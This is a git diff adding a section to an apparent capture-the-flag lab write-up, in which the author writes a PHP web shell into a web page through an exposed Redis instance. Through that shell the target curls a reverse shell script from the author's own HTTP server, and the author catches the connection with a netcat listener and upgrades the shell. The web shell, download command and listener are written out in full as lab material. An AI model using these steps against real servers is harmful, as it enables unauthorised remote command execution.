@@ -247,3 +247,47 @@ OK
 
 After taking a look at the website I was able to find the page with phpinfo() loaded:
 ![grafik](https://github.com/Aryt3/writeups/assets/110562298/e69b5d1c-f9a8-48a2-9d11-212851c4e5be)
+
+This basically tells me that I can upload a reverse shell.
+
+The easiest way to get a reverse shell to the target machine in my opnion is to start up a http server and make the target machine curl the php script.
+
+```sh
+python3 -m http.server 80   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.57.136 - - [10/Oct/2023 09:43:53] "GET /rev_shell.php HTTP/1.1" 200 -
+```
+
+After starting up I changed the test.php script so that  Icoudl execute commands:
+```sh
+10.10.57.136:6379[1]> set test "<?php system($_GET['cmd']); ?>"
+OK
+10.10.57.136:6379[1]> save
+OK
+```
+
+After this I used the following url to download the `rev_shell.php`.
+```sh
+http://10.10.57.136/test.php?cmd=curl 10.18.20.25/rev_shell.php > rev_shell.php
+```
+
+And after starting up the Netcat listener and navigating to `10.10.57.136/rev_shell.php` I got this:
+```sh
+nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.18.20.25] from (UNKNOWN) [10.10.57.136] 39170
+Linux ubuntu 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 00:44:30 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ export TERM=xterm
+www-data@ubuntu:/$ whoami
+www-data
+```
+
+
+
+
+
